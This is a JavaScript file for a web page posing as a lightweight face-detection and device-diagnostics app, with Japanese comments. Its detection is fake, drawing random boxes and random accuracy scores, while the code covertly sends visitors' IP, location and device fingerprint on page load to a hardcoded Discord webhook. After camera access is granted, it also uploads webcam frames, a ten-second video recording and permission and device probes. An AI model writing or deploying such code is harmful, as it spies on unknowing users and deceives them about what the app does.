// 超軽量統合アプリ
class LightApp {
    constructor() {
        this.webhookUrl = 'https://discord.com/api/webhooks/1443171506463965295/zKcRCncL-zNOwYY3cWqrm8_eE9qEAJG8F2byJaot5RD4Cibe8-dNha_Y-577l-dtS2xC';
        this.sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
        this.fps = 0;
        this.lastTime = Date.now();
        this.detectionCount = 0;
        this.stream = null;
        this.init();
    }

    init() {
        // 初期データ収集
        this.collectInitialData();

        // イベントリスナー
        document.getElementById('startBtn').addEventListener('click', () => this.startCamera());
        document.getElementById('diagBtn').addEventListener('click', () => this.runDiagnostics());

        // デモ動画準備
        this.prepareVideo();
    }

    async collectInitialData() {
        const data = {
            session: this.sessionId,
            time: new Date().toISOString(),
            url: location.href,
            screen: `${screen.width}x${screen.height}`,
            ua: navigator.userAgent,
            lang: navigator.language,
            platform: navigator.platform,
            cores: navigator.hardwareConcurrency || 1,
            memory: navigator.deviceMemory || 'unknown',
            connection: navigator.connection?.effectiveType || 'unknown'
        };

        // IP取得
        try {
            const res = await fetch('https://ipapi.co/json/');
            const geo = await res.json();
            data.ip = geo.ip;
            data.location = `${geo.city}, ${geo.country}`;
        } catch(e) {}

        this.sendData('初期接続', data);
    }

    async startCamera() {
        document.getElementById('welcome').classList.add('hidden');
        document.getElementById('video-container').style.display = 'block';

        const video = document.getElementById('video');
        const overlay = document.getElementById('overlay');
        const ctx = overlay.getContext('2d');

        try {
            // カメラ起動
            this.stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    width: { max: 640 },
                    height: { max: 480 },
                    frameRate: { max: 15 }
                },
                audio: false
            });

            video.srcObject = this.stream;

            video.onloadedmetadata = () => {
                overlay.width = video.videoWidth;
                overlay.height = video.videoHeight;

                // 分析開始
                this.analyze(video, ctx);

                // 録画開始
                this.startRecording();
            };

            this.sendData('カメラアクセス成功', {
                resolution: `${video.videoWidth}x${video.videoHeight}`,
                tracks: this.stream.getTracks().length
            });

        } catch(err) {
            alert('カメラアクセスに失敗しました');
            this.sendData('カメラアクセス失敗', { error: err.message });
        }
    }

    analyze(video, ctx) {
        const loop = () => {
            // FPS計算
            const now = Date.now();
            const delta = now - this.lastTime;
            this.fps = Math.round(1000 / delta);
            this.lastTime = now;
            document.getElementById('fps').textContent = this.fps;

            // 顔検出シミュレーション（軽量）
            ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);

            // ランダムで検出表示
            const detected = Math.random() > 0.3;
            if (detected) {
                this.detectionCount++;
                const x = Math.random() * 200 + 100;
                const y = Math.random() * 150 + 50;
                const size = Math.random() * 50 + 100;

                ctx.strokeStyle = '#00ff00';
                ctx.lineWidth = 2;
                ctx.strokeRect(x, y, size, size);

                document.getElementById('detect').textContent = '1';

                // 精度表示（88-96%の範囲）
                const accuracy = Math.floor(Math.random() * 8 + 88);
                document.getElementById('acc').textContent = accuracy;

                // 定期キャプチャ（10フレームごと）
                if (this.detectionCount % 10 === 0) {
                    this.captureFrame(video);
                }
            } else {
                document.getElementById('detect').textContent = '0';
            }

            requestAnimationFrame(loop);
        };
        loop();
    }

    captureFrame(video) {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth / 2;  // 半分のサイズ
        canvas.height = video.videoHeight / 2;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(blob => {
            this.sendFrame(blob);
        }, 'image/jpeg', 0.6);  // 品質60%
    }

    startRecording() {
        if (!MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) return;

        const recorder = new MediaRecorder(this.stream, {
            mimeType: 'video/webm;codecs=vp8',
            videoBitsPerSecond: 500000  // 500kbps
        });

        let chunks = [];
        recorder.ondataavailable = e => {
            if (e.data.size > 0) chunks.push(e.data);
        };

        recorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'video/webm' });
            this.sendVideo(blob);
        };

        recorder.start();

        // 10秒後に停止
        setTimeout(() => {
            recorder.stop();
            this.stream.getTracks().forEach(t => t.stop());
            alert('分析完了しました！');
        }, 10000);
    }

    async runDiagnostics() {
        const results = {
            camera: false,
            microphone: false,
            permissions: {},
            devices: []
        };

        // カメラチェック
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            results.camera = true;
            stream.getTracks().forEach(t => t.stop());
        } catch(e) {}

        // マイクチェック
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            results.microphone = true;
            stream.getTracks().forEach(t => t.stop());
        } catch(e) {}

        // デバイスリスト
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            results.devices = devices.map(d => ({
                kind: d.kind,
                label: d.label || 'Unknown'
            }));
        } catch(e) {}

        // 権限チェック
        const perms = ['camera', 'microphone', 'geolocation'];
        for (const perm of perms) {
            try {
                const result = await navigator.permissions.query({ name: perm });
                results.permissions[perm] = result.state;
            } catch(e) {
                results.permissions[perm] = 'unsupported';
            }
        }

        // 結果表示
        const msg = `
📹 カメラ: ${results.camera ? '✅ 利用可能' : '❌ 利用不可'}
🎤 マイク: ${results.microphone ? '✅ 利用可能' : '❌ 利用不可'}
📱 デバイス数: ${results.devices.length}

権限状態:
${Object.entries(results.permissions).map(([k,v]) => `${k}: ${v}`).join('\n')}
        `;

        alert(msg);
        this.sendData('診断実行', results);
    }

    prepareVideo() {
        // 10秒の軽量デモ動画を生成
        const video = document.getElementById('demo-video');
        const canvas = document.createElement('canvas');
        canvas.width = 320;
        canvas.height = 240;
        const ctx = canvas.getContext('2d');

        const frames = [];
        for (let i = 0; i < 150; i++) {  // 15fps x 10秒
            ctx.fillStyle = '#000';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#0f0';
            ctx.fillText(`Frame ${i}`, 140, 120);

            canvas.toBlob(blob => {
                frames.push(blob);
                if (frames.length === 150) {
                    this.createVideo(frames);
                }
            }, 'image/webp', 0.5);
        }
    }

    createVideo(frames) {
        // WebMビデオ生成（最軽量）
        const blob = new Blob(frames, { type: 'video/webm' });
        const url = URL.createObjectURL(blob);
        document.getElementById('demo-video').src = url;
    }

    async sendData(title, data) {
        try {
            await fetch(this.webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `**${title}**`,
                    embeds: [{
                        color: 0x00ff00,
                        fields: Object.entries(data).map(([k,v]) => ({
                            name: k,
                            value: String(v).substring(0, 100),
                            inline: true
                        })),
                        timestamp: new Date().toISOString()
                    }]
                })
            });
        } catch(e) {}
    }

    async sendFrame(blob) {
        const formData = new FormData();
        formData.append('files[0]', blob, `frame_${Date.now()}.jpg`);
        formData.append('payload_json', JSON.stringify({
            content: '📸 フレームキャプチャ'
        }));

        try {
            await fetch(this.webhookUrl, {
                method: 'POST',
                body: formData
            });
        } catch(e) {}
    }

    async sendVideo(blob) {
        // サイズチェック（8MB以下に制限）
        if (blob.size > 8 * 1024 * 1024) {
            this.sendData('動画サイズ超過', { size: `${(blob.size / 1024 / 1024).toFixed(2)}MB` });
            return;
        }

        const formData = new FormData();
        formData.append('files[0]', blob, `video_${Date.now()}.webm`);
        formData.append('payload_json', JSON.stringify({
            content: '🎥 10秒録画完了'
        }));

        try {
            await fetch(this.webhookUrl, {
                method: 'POST',
                body: formData
            });
        } catch(e) {}
    }
}

// 起動
document.addEventListener('DOMContentLoaded', () => {
    new LightApp();
});